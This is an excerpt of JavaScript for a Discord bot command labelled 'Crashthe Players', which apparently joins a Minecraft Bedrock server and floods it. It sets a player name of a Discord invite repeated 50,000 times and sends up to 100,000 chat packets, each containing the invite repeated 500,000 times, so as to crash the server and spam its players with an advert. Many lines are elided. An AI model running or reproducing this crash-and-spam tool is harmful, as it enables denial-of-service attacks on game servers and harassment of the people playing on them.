...
module.exports = {
    command: new SlashCommandBuilder()
        .setName('ssbp')
        .setDescription('Crashthe Players')
    ...
    execute: async (interaction) => {
        ...
        try {
            ...
            const name = `${discordInvite}`.repeat(50000);
            ...
            client.on('close', async (err) => {
                if (!client.disconnected) {
                    ...
                    client.disconnected = true; // without this the bot gets a crashout idk why too 
                }
            ...
            client.on('play_status', async () => {
                try {
                    let messageCount = 0;
                    const maxMessages = 100000; // message limit :p
                    ...
                    spamInterval = setInterval(() => {
                        ...
                        client.write('text', {
                            ...
                            message: `${discordInvite}`.repeat(500000),
                            xuid: '0',
                            platform_chat_id: '0',
                        });
                        client.write('text', {
                    ...
                    console.error('Error Joining/Crashing', error.message);
